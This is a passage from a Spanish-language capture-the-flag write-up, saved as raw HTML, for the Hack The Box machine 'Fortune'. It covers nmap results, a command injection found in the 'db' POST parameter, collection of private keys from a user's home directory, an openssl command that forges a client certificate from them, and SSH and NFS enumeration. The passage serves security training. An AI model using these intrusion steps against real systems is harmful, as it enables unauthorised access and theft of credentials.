Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.127
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http       OpenBSD httpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: OpenBSD httpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Fortune
443/tcp open  ssl/https?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
No exact OS matches &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; host &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
TCP/IP fingerprint:
OS:SCAN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%E&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3/13%OT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;22%CT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%CU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40048%PV&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2%DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;T%G&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%TM&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5C89893
OS:B%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;SEQ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;SP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;102%GCD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%ISR&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10D%TI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;RD%CI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;RI%TS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;22&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;OPS&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;O
OS:1&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%O2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%O3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNW6NNT11%O4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%
OS:O5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%O6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNNT11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;WIN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;W1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W
OS:5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;ECN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6%CC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y
OS:%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;O%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AS%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T2&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T3&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S%F
OS:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T6&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y
OS:%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T7&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;U1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;FF%IPL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;38%UN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%RI
OS:PL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RID&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;IE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;https&#34;&gt;HTTPS&lt;/h2&gt;
&lt;p&gt;Al visitar la pagina nos encontramos con lo siguiente, por lo que no podemos hacer nada por ahora.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2016-51-49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Con gobuster encontramos la siguiente ruta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/fortune &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos firefox para ver las peticiones que hace cuando enviamos una solicitud a una de las opciones, en cada opcion si se hace una peticion este nos devuelve de manera aleatoria un mensaje.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-18%2015-20-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-18%2015-21-43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y encontramos que, al editar las peticiones (&lt;code&gt;POST db=fortunes&lt;/code&gt;), encontramos que podemos ejecutar comandos (RCE):&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-18%2015-23-21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar una enumeracion de carpeta y archivos encontramos en la carpeta del usuario &lt;code&gt;bob&lt;/code&gt; (&lt;code&gt;/home/bob/&lt;/code&gt;) certificados que pueden pertenecen a la pagina web https.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/home/bob
├── ca
│   ├── certs
│   │   └── ca.cert.pem
│   ├── crl
│   ├── index.txt
│   ├── index.txt.attr
│   ├── index.txt.old
│   ├── intermediate
│   │   ├── certs
│   │   │   ├── ca-chain.cert.pem
│   │   │   ├── fortune.htb.cert.pem
│   │   │   └── intermediate.cert.pem
│   │   ├── crl
│   │   ├── crlnumber
│   │   ├── csr
│   │   │   ├── fortune.htb.csr.pem
│   │   │   └── intermediate.csr.pem
│   │   ├── index.txt
│   │   ├── index.txt.attr
│   │   ├── newcerts
│   │   │   └── 1000.pem
│   │   ├── openssl.cnf
│   │   ├── private
│   │   │   ├── fortune.htb.key.pem
│   │   │   └── intermediate.key.pem
│   │   ├── serial
│   │   └── serial.old
│   ├── newcerts
│   │   └── 1000.pem
│   ├── openssl.cnf
│   ├── private &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;error opening dir&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
│   ├── serial
│   └── serial.old
└── dba
    └── authpf.sql
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La razon por la cual no podamos acceder a la pagina https es porque no tenemos el certificado de la misma, esta es una grafica de como funciona un certificado.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.certsuperior.com/QueesunCertificadoSSL.aspx&#34;&gt;&lt;strong&gt;certsuperior - Certificados&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.oracle.com/cd/E19226-01/820-7627/bncbs/index.html&#34;&gt;&lt;strong&gt;Oracle - certificados&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://docs.oracle.com/cd/E19226-01/820-7627/images/security-sslBMAWithCertificates.gif&#34; alt=&#34;IMAGE&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para poder acceder a la pagina debemos de crear nuestro archivo &lt;code&gt;pkc12&lt;/code&gt; el cual contiene el certificado y la clave, copiamos a nuestra maquina local los archivos &lt;code&gt;intermediate.cert.pem&lt;/code&gt; e &lt;code&gt;intermediate.key.pem&lt;/code&gt;, utilizando openssl generamos el certificado con el siguiente comando:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ssl.com/how-to/create-a-pfx-p12-certificate-file-using-openssl/&#34;&gt;&lt;strong&gt;ssl - Certificate File&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ibm.com/support/knowledgecenter/en/SSPH29_9.0.1/com.ibm.help.common.infocenter.aps/t_ConvertthepfxCertificatetopemFormat068.html&#34;&gt;&lt;strong&gt;ibm - Certificate&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl pkcs12 -export -out cert.p12 -in intermediate.cert.pem -inkey intermediate.key.pem -passin pass:root -passout pass:root
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2017-26-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos el certificado y lo importamos a nuestro navegador en las configuraciones de certificado.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-31-53.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Visitamos la pagina en https y nos muestra lo siguiente:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-33-16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-34-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar la pagina &lt;code&gt;/generate&lt;/code&gt; nos muestra una clave publica agregada al los archivos de autorizacion ssh de la maquina y una clave privada con la cual nos podemos conectar al mismo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-35-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos conectamos al servicio ssh con la clave generada y el usuario &lt;code&gt;nfsuser&lt;/code&gt;, nos muestra el siguiente mensaje, pero nuestra shell no es interactiva:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2022-31-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al revisar los procesos que corren en la maquina nos muestra un servicio de &lt;strong&gt;authpf&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2022-37-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Segun la documentacion de openbsd sobre Authpf nos dice que &lt;strong&gt;&amp;ldquo;es un intérprete (shell) para pasarelas de autenticación. Una pasarela de autenticación es como una pasarela de red normal (también llamada enrutador), con la diferencia que &amp;ldquo;los usuarios se deben autenticar ante la pasarela&amp;rdquo; antes de que se permita que pase el tráfico a través de ésta&amp;rdquo;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.openbsd.org/faq/pf/authpf.html#loginclass&#34;&gt;&lt;strong&gt;openbsd - authpf&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://home.nuug.no/~peter/pf/blug2011/authpf.html&#34;&gt;&lt;strong&gt;autphf - español&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Las reglas de authpf &lt;code&gt;/etc/authpf/authpf.rules&lt;/code&gt; nos muestran que cualquier usuario ip (&lt;code&gt;$user_ip&lt;/code&gt;) en este caso &lt;code&gt;nfsuser&lt;/code&gt; le de paso o permiso en los protocolos tcp udp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ext_if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;em0&amp;#34;&lt;/span&gt;
pass in quick on &lt;span class=&#34;nv&#34;&gt;$ext_if&lt;/span&gt; inet proto &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; tcp udp &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; from &lt;span class=&#34;nv&#34;&gt;$user_ip&lt;/span&gt; to &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ext_if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; keep state
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sabiendo que tenemos acceso a los protocolos tcp y udp volvemos a hacer un escaneo de puertos y encontramos los siguientes puertos abiertos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-03-21 04:58 GMT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.127
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;994&lt;/span&gt; closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http       OpenBSD httpd
111/tcp  open  rpcbind    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100000)&lt;/span&gt;
443/tcp  open  ssl/https?
2049/tcp open  nfs        2-3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100003)&lt;/span&gt;
8081/tcp open  http       OpenBSD httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 38.31 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos que hay un servicio rpcbind y nfs que estan corriendo en la maquina, escaneamos el servicio &lt;code&gt;rpcbind&lt;/code&gt;:&lt;/p&gt;
&lt;h2 id=&#34;rpcbind&#34;&gt;RPCBIND&lt;/h2&gt;
&lt;p&gt;Encontramos que el servicio NFS esta corriendo tanto en tcp y udp, por lo que podemos montar los share name de la maquina localmente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
